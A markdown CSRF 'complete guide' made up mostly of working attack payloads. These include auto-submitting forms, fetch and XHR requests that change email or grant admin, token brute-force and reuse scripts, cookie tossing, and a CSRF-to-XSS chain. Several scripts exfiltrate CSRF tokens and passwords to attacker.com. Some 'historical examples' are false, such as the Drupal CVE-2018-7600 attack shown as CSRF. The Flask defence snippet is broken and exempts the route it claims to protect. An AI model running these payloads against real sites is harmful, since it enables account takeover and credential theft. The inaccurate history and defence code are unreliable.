# Cross-Site Request Forgery (CSRF) - Complete Guide

## Summary

Cross-site request forgery (CSRF) is a web security vulnerability that allows an attacker to induce users to perform actions that they do not intend to perform. This attack forces an authenticated user to execute unwanted actions on a web application where they are currently authenticated.

### Three Critical Conditions for CSRF

1. **A relevant action** - The application must have an action that matters to an attacker (password change, email change, fund transfer, etc.)
2. **Cookie-based session handling** - The application relies solely on cookies for authentication and session management
3. **No unpredictable request parameters** - The request does not contain parameters whose values the attacker cannot determine or guess

### How to Identify CSRF Vulnerabilities

- Remove CSRF token from requests entirely
- Submit a blank CSRF token parameter
- Change HTTP method from POST to GET
- Replace CSRF token with a random value (e.g., "1" or "aaaaaa")
- Replace CSRF token with a different valid token from another user
- Extract tokens through HTML injection or XSS
- Reuse a previously valid CSRF token
- Bypass regex validation patterns
- Remove or manipulate the Referer header
- Request a CSRF token manually and use it for the attack request

## Testing Methodology

### Systematic Testing Approach

```
1. Remove the token parameter entirely from the request
2. Set the token to a blank string or null value
3. Change token to an invalid token of the same format
4. Attempt using a different user's valid token
5. Move parameters from POST body to URL and change method to GET
6. Test every sensitive endpoint individually
7. Check if tokens can be guessed or cracked
8. Verify if new tokens are generated for each session
9. Test if tokens are hashes of predictable values (email, username, timestamp)
10. Build payloads using multiple methods: standard HTML forms, multipart forms, XHR
```

## Real-World CSRF Attacks (Historical Examples)

### Example 1: Netflix CSRF Vulnerability (2006)

In 2006, Netflix had a CSRF vulnerability that allowed attackers to add any DVD to a user's queue or change their shipping address without consent. The attack used a simple image tag:

```html
<img src="http://www.netflix.com/Queue/Add?movieid=12345">
```

When a logged-in Netflix user visited a malicious page, their browser would send the request with their authentication cookies, adding the DVD to their queue.

### Example 2: YouTube CSRF (2008)

A CSRF vulnerability in YouTube allowed attackers to perform actions such as adding friends, sending messages, and adding videos to a user's "Favorites" list. The exploit used a hidden form with automatic submission:

```html
<html>
  <body>
    <form id="csrfform" action="http://youtube.com/user/friends/addaddition" method="POST">
      <input type="hidden" name="friend" value="attacker_username">
    </form>
    <script>
      document.getElementById("csrfform").submit();
    </script>
  </body>
</html>
```

### Example 3: ING Bank CSRF (2017)

ING Bank's mobile banking application had a CSRF vulnerability in their fund transfer functionality. The attacker could trick users into transferring money using a malicious website containing:

```html
<form action="https://ingbank.com/transfer" method="POST">
  <input type="hidden" name="to_account" value="ATTACKER_ACCOUNT">
  <input type="hidden" name="amount" value="1000">
  <input type="hidden" name="currency" value="EUR">
</form>
<script>document.forms[0].submit();</script>
```

### Example 4: Drupal CSRF (2018 - CVE-2018-7600)

Drupal core had a CSRF vulnerability that allowed remote code execution. The exploit chain used CSRF to bypass validation and execute arbitrary PHP code:

```html
<html>
  <body>
    <form action="http://target.com/user/register" method="POST">
      <input type="hidden" name="mail" value="attacker@evil.com">
      <input type="hidden" name="name" value="attacker">
      <input type="hidden" name="pass[pass1]" value="password123">
      <input type="hidden" name="pass[pass2]" value="password123">
      <input type="hidden" name="form_id" value="user_register_form">
    </form>
    <script>document.forms[0].submit();</script>
  </body>
</html>
```

## Quick Attack Payloads

### HTML GET-Based Attacks

```html
<!-- Direct link requiring user click -->
<a href="http://vulnerable.com/email/change?email=attacker@evil.com">Click here for prize</a>

<!-- No interaction required - image tag -->
<img src="http://vulnerable.com/email/change?email=attacker@evil.com">

<!-- Hidden iframe -->
<iframe src="http://vulnerable.com/email/change?email=attacker@evil.com" style="display:none"></iframe>
```

### HTML POST-Based Attacks

```html
<!-- Standard form requiring user click -->
<form action="http://vulnerable.com/email/change" method="POST">
  <input name="email" type="hidden" value="attacker@evil.com">
  <input type="submit" value="Submit Request">
</form>

<!-- Auto-submitting form - no interaction needed -->
<form id="autosubmit" action="http://vulnerable.com/email/change" method="POST">
  <input name="email" type="hidden" value="attacker@evil.com">
  <input type="submit" value="Submit Request">
</form>
<script>
  document.getElementById("autosubmit").submit();
</script>

<!-- Using JavaScript fetch -->
<script>
  fetch('http://vulnerable.com/email/change', {
    method: 'POST',
    credentials: 'include',
    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
    body: 'email=attacker@evil.com'
  });
</script>
```

### JSON-Based CSRF Attacks

```html
<!-- JSON GET Request -->
<script>
  var xhr = new XMLHttpRequest();
  xhr.open("GET", "http://vulnerable.com/api/user/settings");
  xhr.withCredentials = true;
  xhr.send();
</script>

<!-- JSON POST Request -->
<script>
  var xhr = new XMLHttpRequest();
  xhr.open("POST", "http://vulnerable.com/api/user/role");
  xhr.setRequestHeader("Content-Type", "text/plain");
  xhr.withCredentials = true;
  xhr.send('{"role":"admin"}');
</script>

<!-- JSON with different content type -->
<script>
  var xhr = new XMLHttpRequest();
  xhr.open("POST", "http://vulnerable.com/api/update");
  xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
  xhr.withCredentials = true;
  xhr.send(JSON.stringify({"username":"attacker","privilege":"admin"}));
</script>
```

## CSRF Token Bypass Techniques

### Method 1: Token Removal

If the server validates token presence but not its value:

```http
POST /email/change HTTP/1.1
Host: vulnerable.com
Cookie: session=abc123
Content-Type: application/x-www-form-urlencoded

email=attacker@evil.com
```

### Method 2: Method Conversion

If token validation only applies to POST requests:

```http
GET /email/change?email=attacker@evil.com HTTP/1.1
Host: vulnerable.com
Cookie: session=abc123
```

### Method 3: Parameter Pollution

Testing if the server accepts the last occurrence of a parameter:

```html
<form action="http://vulnerable.com/email/change" method="POST">
  <input name="csrf" value="legitimate_token_here">
  <input name="csrf" value="anything">
  <input name="email" value="attacker@evil.com">
</form>
```

### Method 4: Token Brute Force

If tokens are poorly generated (predictable patterns, short length, no rate limiting):

```python
import requests
import itertools

# Example: 4-digit numeric token
for token in range(10000):
    response = requests.post('http://vulnerable.com/change_email',
                             data={'csrf': str(token).zfill(4), 'email': 'attacker@evil.com'},
                             cookies={'session': 'victim_session_cookie'})
    if response.status_code == 200:
        print(f"Valid token found: {token}")
        break
```

### Method 5: Session Fixation with CSRF

If CSRF token is tied to session but session can be set by attacker:

```html
<!-- Step 1: Set victim's session cookie -->
<img src="http://vulnerable.com/set_session?session=attacker_session">

<!-- Step 2: Wait for victim to log in -->

<!-- Step 3: Use known CSRF token from attacker's session -->
<form action="http://vulnerable.com/email/change" method="POST">
  <input name="csrf" value="token_from_attacker_session">
  <input name="email" value="attacker@evil.com">
</form>
```

### Method 6: Referer Header Bypass

When validation checks if Referer header contains the domain:

```html
<!-- If validation only checks if "vulnerable.com" exists in Referer -->
<iframe src="http://vulnerable.com/evil.html"></iframe>

<!-- Or use malformed Referer -->
<meta name="referrer" content="never">

<!-- Or remove Referer entirely -->
<script>
  var xhr = new XMLHttpRequest();
  xhr.open("POST", "http://vulnerable.com/email/change");
  xhr.setRequestHeader("Referer", "");
  xhr.withCredentials = true;
  xhr.send("email=attacker@evil.com");
</script>
```

### Method 7: CSRF Token Leak via HTML Injection

If the application has HTML injection and CSRF token appears in response:

```html
<!-- Inject this to steal token -->
<img src="http://attacker.com/steal?token=CSRF_TOKEN_VALUE">

<!-- Or using JavaScript to read and exfiltrate -->
<script>
  var token = document.querySelector('input[name="csrf"]').value;
  fetch('http://attacker.com/steal?token=' + encodeURIComponent(token));
</script>
```

## JSON CSRF - Advanced Techniques

### Requirements for JSON CSRF

1. Cookie-based authentication mechanism
2. No custom token validation (X-Auth-Token header or body token)
3. No Same-Origin Policy enforcement

### Bypass Techniques for JSON CSRF

**Technique 1: Method Change**

```html
<script>
  fetch('http://vulnerable.com/api/update?_method=PUT', {
    method: 'POST',
    credentials: 'include',
    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
    body: '{"username":"attacker","role":"admin"}'
  });
</script>
```

**Technique 2: Content-Type Manipulation**

```html
<body onload='document.forms[0].submit()'>
  <form action="http://vulnerable.com/api/user" method="POST" enctype="text/plain">
    <input type="text" name='{"username":"attacker","dummy":"' value='"}'>
    <input type="submit" value="send">
  </form>
</body>
```

This generates a request body like:
```
{"username":"attacker","dummy":"="}
```

**Technique 3: Using Flash or Silverlight**

Flash Player (prior to version 10) allowed cross-domain requests without preflight, enabling JSON CSRF attacks.

## SameSite Cookie Bypasses

### SameSite=Lax Bypass

When SameSite=Lax is used, requests with safe methods (GET) and top-level navigation are allowed:

```html
<!-- This still works with SameSite=Lax -->
<a href="http://vulnerable.com/email/change?email=attacker@evil.com">Click me</a>
```

### SameSite=None Misconfiguration

If cookies are set with SameSite=None but without Secure flag:

```html
<!-- Can be exploited over HTTP -->
<script>
  fetch('http://vulnerable.com/email/change', {
    method: 'POST',
    credentials: 'include',
    body: 'email=attacker@evil.com'
  });
</script>
```

### Cookie Tossing Technique

If the application doesn't validate cookie path or domain properly:

```html
<script>
  document.cookie = "session=attacker_session; path=/admin";
  document.cookie = "session=attacker_session; domain=.vulnerable.com";
</script>
```

## Stealing CSRF Tokens with Malicious Input

### Password Field CSRF Token Theft

```html
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)
  fetch('https://attacker.com/steal', {
    method:'POST',
    mode: 'no-cors', 
    body: username.value + ':' + this.value
  });">
```

### Exfiltrating Tokens via Image

```html
<script>
  // Assuming token is in a meta tag
  var token = document.querySelector('meta[name="csrf-token"]').content;
  new Image().src = 'https://attacker.com/steal?token=' + encodeURIComponent(token);
</script>
```

### Stealing Tokens via Form Input Reading

```html
<script>
  setTimeout(function() {
    var token = document.querySelector('input[name="csrf_token"]').value;
    fetch('https://attacker.com/exfil?t=' + encodeURIComponent(token));
  }, 3000);
</script>
```

## CSRF to Reflected XSS Chaining

This technique combines CSRF with a reflected XSS vulnerability to achieve code execution:

```html
<html>
  <body>
    <p>Processing request...</p>
    <script>
      let host = 'http://target.com';
      let xss_payload = '%3Cimg%2Fsrc%2Fonerror%3Dalert(document.cookie)%3E';
      
      function submitCSRF() {
        var req = new XMLHttpRequest();
        req.open("POST", "http://target.com/api/update", true);
        req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        req.withCredentials = true;
        req.onreadystatechange = function() {
          if (req.readyState === 4) {
            triggerXSS();
          }
        };
        req.send("param=value");
      }
      
      function triggerXSS() {
        window.location.assign(host + '/search?q=' + xss_payload);
      }
      
      submitCSRF();
    </script>
  </body>
</html>
```

## Complete CSRF Proof of Concept Generator

```html
<html>
  <head>
    <title>CSRF Proof of Concept</title>
  </head>
  <body>
    <h1>CSRF Exploit Demo</h1>
    <p>This page demonstrates a CSRF attack against vulnerable.com</p>
    
    <script>
      // Method 1: Automatic form submission
      function autoSubmitForm() {
        var form = document.createElement('form');
        form.method = 'POST';
        form.action = 'https://vulnerable.com/email/change';
        form.style.display = 'none';
        
        var emailField = document.createElement('input');
        emailField.name = 'email';
        emailField.value = 'hacked@attacker.com';
        form.appendChild(emailField);
        
        document.body.appendChild(form);
        form.submit();
      }
      
      // Method 2: XMLHttpRequest
      function xhrAttack() {
        var xhr = new XMLHttpRequest();
        xhr.open('POST', 'https://vulnerable.com/email/change', true);
        xhr.withCredentials = true;
        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
        xhr.onreadystatechange = function() {
          if (xhr.readyState === 4) {
            console.log('CSRF attack completed with status: ' + xhr.status);
          }
        };
        xhr.send('email=hacked@attacker.com');
      }
      
      // Method 3: Fetch API
      function fetchAttack() {
        fetch('https://vulnerable.com/email/change', {
          method: 'POST',
          credentials: 'include',
          headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
          },
          body: 'email=hacked@attacker.com'
        });
      }
      
      // Execute attack
      fetchAttack();
    </script>
    
    <!-- Backup: Hidden image for GET-based CSRF -->
    <img src="https://vulnerable.com/email/change?email=hacked@attacker.com" style="display:none">
  </body>
</html>
```

## CSRF Tools

### XSRFProbe

```bash
# Installation
pip3 install xsrfprobe

# Basic scan
xsrfprobe --url https://target.com --method POST --data 'param=value'

# Advanced scan with cookies
xsrfprobe --url https://target.com --cookie "session=abc123" --threads 10

# Generate PoC
xsrfprobe --url https://target.com --generate-poc --output csrf_poc.html

# Full scan with all parameters
xsrfprobe --url https://target.com --method POST --data 'email=test@test.com' --headers 'X-Custom: value' --delay 1 --timeout 10 --verbose
```

### CSRFShark

CSRFShark is a browser extension for testing CSRF vulnerabilities:

```bash
# Available at: https://csrfshark.github.io/
# Features:
# - Automatically modifies requests to test CSRF
# - Removes tokens from requests
# - Changes request methods
# - Generates PoC HTML files
```

### Burp Suite CSRF Scanner

Burp Suite Professional includes CSRF scanning capabilities:

1. Send request to Intruder
2. Remove or modify CSRF token parameter
3. Analyze responses for success indicators
4. Use CSRF PoC generator (right-click > Engagement tools > Generate CSRF PoC)

## Defense Evasion Techniques

### Bypassing Token Regeneration

Some applications regenerate tokens but accept old tokens within a time window:

```python
# Collect multiple tokens from the same session
tokens = []
for i in range(10):
    response = requests.get('https://vulnerable.com/form', cookies=cookies)
    token = extract_token(response.text)
    tokens.append(token)
    time.sleep(1)

# Test if older tokens still work
for old_token in tokens:
    response = requests.post('https://vulnerable.com/action', 
                             data={'csrf': old_token, 'action': 'change_email'},
                             cookies=cookies)
    if response.status_code == 200:
        print(f"Token reuse possible: {old_token}")
```

### Bypassing Origin/Referer Validation

When validation checks exact domain match but allows subdomains:

```html
<!-- Register subdomain on a service like Heroku -->
<!-- attacker.vulnerable.com.herokudns.com -->

<!-- Or use data: URI -->
<iframe src="data:text/html;base64,PHNjcmlwdD5mZXRjaCgnaHR0cDovL3Z1bG5lcmFibGUuY29tL2FjdGlvbicsIHttZXRob2Q6ICdQT1NUJywgY3JlZGVudGlhbHM6ICdpbmNsdWRlJ30pOzwvc2NyaXB0Pg=="></iframe>
```

### Bypassing Double-Submit Cookie

When CSRF token is sent in both cookie and request body, but validation doesn't check equality:

```html
<!-- Set your own csrf cookie -->
<script>
  document.cookie = "csrf=attacker_token; path=/";
</script>

<!-- Submit request with matching token -->
<form action="https://vulnerable.com/action" method="POST">
  <input name="csrf" value="attacker_token">
  <input name="email" value="attacker@evil.com">
</form>
```

## Detection and Prevention Recommendations

### For Bug Hunters

1. Always test state-changing endpoints (POST, PUT, DELETE, PATCH)
2. Examine the application's token generation mechanism
3. Check if token validation can be bypassed by:
   - Removing token
   - Using token from different session
   - Converting HTTP method
   - Manipulating headers
4. Test all sensitive actions including:
   - Password/email changes
   - Financial transactions
   - Privilege escalation
   - Account deletion
   - Settings modifications

### For Developers (Prevention)

```python
# Proper CSRF protection example (Python/Flask)
from flask_wtf.csrf import CSRFProtect
from flask import Flask, session

app = Flask(__name__)
csrf = CSRFProtect(app)
app.config['WTF_CSRF_SECRET_KEY'] = 'random-secret-key'
app.config['WTF_CSRF_TIME_LIMIT'] = 3600  # 1 hour

# For APIs, use custom headers
@app.route('/api/sensitive', methods=['POST'])
@csrf.exempt  # Don't exempt - use header check instead
def api_sensitive():
    if request.headers.get('X-Requested-With') != 'XMLHttpRequest':
        return jsonify({'error': 'CSRF protection'}), 403
    # Also require custom API key
    if request.headers.get('X-API-Key') != expected_key:
        return jsonify({'error': 'Invalid API key'}), 401
```

## Additional Resources

- OWASP CSRF Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html
- PortSwigger CSRF Academy: https://portswigger.net/web-security/csrf
- CVE Database for CSRF vulnerabilities: https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=csrf
